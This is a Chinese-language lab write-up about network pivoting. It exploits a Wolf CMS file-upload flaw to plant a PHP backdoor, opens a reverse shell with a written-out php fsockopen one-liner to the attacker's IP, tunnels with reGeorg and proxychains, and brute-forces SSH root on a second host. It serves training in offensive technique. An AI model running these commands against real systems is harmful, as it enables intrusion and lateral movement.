# 0x01 前言

最近在看 Cobalt Strike 4.0 手册的时候，一直遇到 `Pivot` 这个词，我也不知道怎么翻译比较好，意思就是把一台受害机器作为支点，以此机器为基础横向？大概是这样吧，刚好翻看今天的 RSS 订阅时看到 `Pivoting` 技术的一个靶机环境，记录下操作。


# 0x02 对目标 A 的操作

**Step 1：扫描目标 A**

```
nmap -sV -script=banner 192.230.141.3
```

![title](https://leanote.com/api/file/getImage?fileId=5e2d18cdab64414de100532d)

看到目标 A 开放了 web 服务。是 Wolf CMS。

![title](https://leanote.com/api/file/getImage?fileId=5e2d1c1aab64414de10053b7)

通过查询 `EXPLOIT DATABASE` 发现 Wolf CMS 存在任意文件上传漏洞：

![title](https://leanote.com/api/file/getImage?fileId=5e2d3c5eab64414de100597a)

上传一个 php 的小马，仅有命令执行和文件上传功能：

![title](https://leanote.com/api/file/getImage?fileId=5e2d3d52ab64414de10059a7)

通过访问路径 `192.230.141.3/public/php-backdoor.php` 查看此小马：

![title](https://leanote.com/api/file/getImage?fileId=5e2d3f7dab64414de1005a04)

**Step 2：开启 PHP 反弹 shell 监听器**

```
# msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set PAYLOAD php/reverse_php
msf5 exploit(multi/handler) > ip addr
# 得到攻击机的本机IP为 192.230.141.2
msf5 exploit(multi/handler) > set LHOST 192.230.141.2
msf5 exploit(multi/handler) > exploit
```

然后就在攻击机器的随意端口通过 msf 开启了反弹 shell 的监听，此处为 4444 端口：

![title](https://leanote.com/api/file/getImage?fileId=5e2d4488ab64414be2005aa4)

在小马上通过此命令弹一个 `/bin/sh` 终端给攻击机器的反弹 shell 监听端口：

![title](https://leanote.com/api/file/getImage?fileId=5e2d45ebab64414be2005adf)

```
php -r '$sock=fsockopen("192.230.141.2",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

![title](https://leanote.com/api/file/getImage?fileId=5e2d46b7ab64414be2005afd)

通过小马的命令执行功能执行此 PHP webshell payload，然后得到一个反弹 shell：

![title](https://leanote.com/api/file/getImage?fileId=5e2d47aaab64414de1005b68)

后面找 flag 的具体步骤就不多说了，通过 `find / -name flag* 2>/dev/null` 命令一下就找到了 flag.txt，不过这不是我关心的重点所以就省略了。

# 0x03 对目标 B 的操作

Step 1：上传 reGeorg 的隧道模块

![title](https://leanote.com/api/file/getImage?fileId=5e2d4a4fab64414be2005b9e)

通过 Wolf CMS 的任意文件上传漏洞上传 `tunnel.php` 文件：

![title](https://leanote.com/api/file/getImage?fileId=5e2d4acaab64414de1005bf5)

通过网站 web 路径访问：

![title](https://leanote.com/api/file/getImage?fileId=5e2d4b0bab64414de1005c04)

**Step 2：连接到 reGerog 隧道模块**

![title](https://leanote.com/api/file/getImage?fileId=5e2d4bb3ab64414be2005bd8)

这样就在攻击机器的 9050 端口开启了 socks 服务器。代理运行在本地 9050 端口：

![title](https://leanote.com/api/file/getImage?fileId=5e2d4cd5ab64414be2005c0b)

新开一个终端，编辑 `proxychains` 配置文件：

```
vim /etc/proxychains.conf
```

![title](https://leanote.com/api/file/getImage?fileId=5e2d4e7fab64414be2005c4b)

然后通过 `proxychains` 命令前缀在代理下执行命令。


**Step 3：扫描目标 B 机器**

在弹回 msf 的反弹 shell 中执行 `ifconfig` 命令，得到机器 A 的 IP 为 `192.58.203.2`：

![title](https://leanote.com/api/file/getImage?fileId=5e2d4fdbab64414be2005c8e)

现在我们想往 IP 为 `192.58.203.3` 的机器 B 上尝试横向。

使用通过 reGeorg 搭的隧道的代理来执行 nmap 扫描目标 B：

![title](https://leanote.com/api/file/getImage?fileId=5e2d51a1ab64414de1005d34)

扫了常见的 1000 端口，发现有且仅有 22 端口的 ssh 服务开放：

![title](https://leanote.com/api/file/getImage?fileId=5e2d51feab64414be2005cef)

**Step 4：爆破目标 B 机器的 root 密码**

![title](https://leanote.com/api/file/getImage?fileId=5e2d5513ab64414be2005d85)
![title](https://leanote.com/api/file/getImage?fileId=5e2d53f6ab64414de1005d9b)

在代理下使用 `hydra` 进行爆破，相当于在内网中进行爆破。爆破出 SSH root 用户的密码为弱口令 `1234567890`。

**Step 5：使用 SSH 登入目标 B 机器**



![title](https://leanote.com/api/file/getImage?fileId=5e2d5737ab64414de1005e26)

注意黄框内的，如果不使用 `proxychains` 工具进行内网代理，不走隧道是无法登进去的。

至此就获得了第二个机器目标 B 的 root 权限，后面依然是使用 `find / -name flag* 2>/dev/null` 命令寻找 flag，flag.txt 文件就在 root 目录下，就不再赘述。


# 0x04 总结

这篇文章就是 `Network Pivoting` 技术的一个实例。以机器 A 为支点入侵机器 B。

我最近看 Cobalt Strike 手册，看到 `Browser Pivoting` 这个技术不是很懂，所以就对 `Pivoting` 这个词比较感兴趣。

其实查阅此手册，发现在第9章有对 `Pivoting` 技术的详细解释：

![title](https://leanote.com/api/file/getImage?fileId=5e2d58dbab64414be2005e2c)


什么是 `Pivoting` 呢？

就是说将一个受害机器变为为其他攻击和工具服务的跳板。

Cobalt Strike 的 Beacon 提供了多种 `pivoting` 选项。前提是 Beacon 处于交互模式（通过 `sleep 0` 命令即可在 Beacon 控制台中设置）。

比如 <u>选项1：SOCKS代理</u>，具体步骤为：

1. 先启动 SOCKS4a 服务器。
2. 然后使用 proxychains 工具强制外部程序使用设置的 SOCKS 代理服务器。

和本文的思路完全一致。只不过在本文中我们是通过 `reGeorge` 工具，而在 CS 中提供了以 CS 的团队服务器作为 SOCKS4a 代理服务器的功能。毕竟，CS 的理念是以团队服务器作为攻击机器。

这里 proxychains 工具也可以换为 Metasploit 框架来替代实现其功能。

其他的 `pivoting` 选项包括反向端口转发等。

因为 Cobalt Strike 手册我还没有看到这部分，等我看到这部分再写文章详细整理。

-----------


## 参考资料：

1. [A tiny PHP/bash reverse shell](https://gist.github.com/podjackel/4d2c6938289f3a2366ccc8cea447350d)，Github

